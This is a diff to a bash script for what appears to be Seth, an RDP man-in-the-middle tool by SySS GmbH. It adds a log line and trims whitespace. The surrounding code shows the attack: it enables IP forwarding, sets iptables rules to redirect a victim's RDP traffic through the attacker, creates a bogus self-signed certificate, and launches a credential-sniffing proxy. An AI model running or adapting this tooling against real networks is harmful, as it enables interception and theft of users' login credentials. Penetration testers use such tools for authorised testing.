@@ -47,6 +47,7 @@ trap finish EXIT
 
 function create_self_signed_cert {
     local CN="$1"
+    echo "[!] Failed to clone certificate, create bogus self-signed certificate..."
     openssl req -subj "/CN=$CN/O=Seth by SySS GmbH" -new \
         -newkey rsa:2048 -days 365 -nodes -x509 \
         -keyout /tmp/$CN.server.key -out /tmp/$CN.server.crt
@@ -66,7 +67,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 
 echo "[*] Set iptables rules for SYN packets..."
 
-set_iptables_1 A "$VICTIM_IP" 
+set_iptables_1 A "$VICTIM_IP"
 
 echo "[*] Waiting for a SYN packet to the original destination..."
 
@@ -93,4 +94,4 @@ set_iptables_2 A "$VICTIM_IP" "$ATTACKER_IP" "$ORIGINAL_DEST"
 
 echo "[*] Run RDP proxy..."
 
-$SCRIPT_DIR/rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" "$ORIGINAL_DEST" 
+$SCRIPT_DIR/rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" "$ORIGINAL_DEST"
